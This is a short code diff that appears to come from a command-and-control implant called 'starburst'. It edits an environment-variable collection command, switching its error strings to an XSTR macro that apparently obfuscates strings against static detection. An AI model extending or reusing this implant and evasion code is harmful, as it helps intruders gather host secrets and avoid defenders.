@@ -20,7 +20,7 @@ auto declfn starburst::cmd_env(
     auto env_block = inst.kernel32.GetEnvironmentStringsW();
     if ( !env_block ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "GetEnvironmentStringsW failed" ) ) );
+            XSTR( "GetEnvironmentStringsW failed" ) );
         return;
     }
 
@@ -39,7 +39,7 @@ auto declfn starburst::cmd_env(
     if ( !output ) {
         inst.kernel32.FreeEnvironmentStringsW( env_block );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
